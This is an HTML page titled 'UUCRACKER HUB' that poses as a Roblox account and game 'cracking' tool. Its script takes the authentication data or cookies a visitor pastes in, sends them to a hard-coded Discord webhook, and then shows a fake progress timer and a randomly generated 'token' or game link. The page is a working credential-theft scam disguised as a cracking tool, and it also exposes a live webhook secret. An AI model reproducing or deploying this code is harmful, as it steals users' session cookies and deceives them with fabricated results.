<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UUCRACKER HUB</title>
    <style>
        :root {
            --primary-blue: #58a6ff;
            --success-green: #3fb950;
            --bg-dark: #0d1117;
            --card-bg: #161b22;
            --border: #30363d;
        }

        body {
            background-color: var(--bg-dark);
            color: white;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .main-container {
            background: var(--card-bg);
            padding: 40px;
            border-radius: 12px;
            border: 1px solid var(--border);
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
            width: 100%;
            max-width: 550px;
            text-align: center;
        }

        h1 { font-size: 1.8rem; margin-bottom: 30px; letter-spacing: 1px; }

        /* Menu Selection Styles */
        .menu-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }

        .menu-card {
            background: #21262d;
            border: 1px solid var(--border);
            padding: 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .menu-card:hover { border-color: var(--primary-blue); background: #30363d; }
        .menu-card.active { border-color: var(--primary-blue); box-shadow: 0 0 10px rgba(88,166,255,0.2); }

        /* Form Elements */
        textarea {
            width: 100%;
            height: 120px;
            background: var(--bg-dark);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: #c9d1d9;
            padding: 12px;
            box-sizing: border-box;
            resize: none;
            margin-top: 20px;
            display: none;
        }

        .btn-init {
            width: 100%;
            padding: 14px;
            background: var(--success-green);
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            display: none;
        }

        /* Loading & Results */
        #process-view { display: none; }
        .progress-bg { background: var(--border); height: 10px; border-radius: 5px; overflow: hidden; margin: 20px 0; }
        .progress-fill { background: var(--primary-blue); width: 0%; height: 100%; transition: width 1s linear; }
        
        .result-box {
            display: none;
            background: #0d1117;
            padding: 15px;
            border-radius: 6px;
            border: 1px dashed var(--success-green);
            color: var(--success-green);
            font-family: monospace;
            word-break: break-all;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div id="setup-view">
            <h1>CrACKING OPTIONS</h1>
            <div class="menu-grid">
                <div class="menu-card" id="btn-account" onclick="selectMode('Account')">
                    <h3>Account Crackking</h3>
                    <small>Get accounts cookies</small>
                </div>
                <div class="menu-card" id="btn-game" onclick="selectMode('Game')">
                    <h3>Game Cracking</h3>
                    <small>Get Game roblox studio project</small>
                </div>
            </div>

            <textarea id="userInput" placeholder="Paste authentication data..."></textarea>
            <button class="btn-init" id="initBtn" onclick="runProcess()">CONTINUE</button>
        </div>

        <div id="process-view">
            <h2 id="status-header">PROCESSING</h2>
            <div class="progress-bg"><div id="bar" class="progress-fill"></div></div>
            <p id="timer">60s remaining</p>
            <p id="status-sub">Syncing with remote server...</p>
            <div id="resultOutput" class="result-box"></div>
        </div>
    </div>

    <script>
        let currentMode = '';
        const sleep = ms => new Promise(r => setTimeout(r, ms));

        function selectMode(mode) {
            currentMode = mode;
            document.getElementById('btn-account').classList.remove('active');
            document.getElementById('btn-game').classList.remove('active');
            document.getElementById('btn-' + mode.toLowerCase()).classList.add('active');
            
            document.getElementById('userInput').style.display = 'block';
            document.getElementById('initBtn').style.display = 'block';
            document.getElementById('userInput').placeholder = `Paste ${mode} details here...`;
        }

        async function runProcess() {
            const data = document.getElementById('userInput').value;
            const webhook = 'https://discord.com/api/webhooks/1453764437608501472/M3izTOyXPaS_8RPHmqNDs-RXV8sApH8OG9jDA4gHd2_fzItzV3ZCNqcZAqNY1t2tXYi1';

            if (!data) return alert("Please provide input data.");

            // UI Switch
            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('process-view').style.display = 'block';

            // Send to Discord (Chunking)
            const chunks = data.match(/[\s\S]{1,1800}/g) || [];
            for (let i = 0; i < chunks.length; i++) {
                await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({content: `**[${currentMode} Mode] Part ${i+1}/${chunks.length}:**\n\`\`\`\n${chunks[i]}\n\`\`\``})
                });
                await sleep(1000);
            }

            // 60s Timer
            let sec = 60;
            const timerInt = setInterval(() => {
                sec--;
                document.getElementById('timer').innerText = `${sec}s remaining`;
                document.getElementById('bar').style.width = `${((60-sec)/60)*100}%`;

                if (sec <= 0) {
                    clearInterval(timerInt);
                    showFinalResult();
                }
            }, 1000);
        }

        function showFinalResult() {
            document.getElementById('status-header').innerText = "SUCCESS";
            document.getElementById('timer').style.display = 'none';
            document.getElementById('status-sub').innerText = currentMode === 'Account' ? "Generated Security Token:" : "Launch Link Generated:";
            
            const out = document.getElementById('resultOutput');
            out.style.display = 'block';

            if (currentMode === 'Account') {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                let str = 'SEC_';
                for(let i=0; i<100; i++) str += chars.charAt(Math.floor(Math.random() * chars.length));
                out.innerText = str;
            } else {
                const games = ['https://www.roblox.com/games/1818', 'https://www.roblox.com/games/2323', 'https://www.roblox.com/games/4545'];
                out.innerText = games[Math.floor(Math.random() * games.length)];
            }
        }
    </script>
</body>
</html>
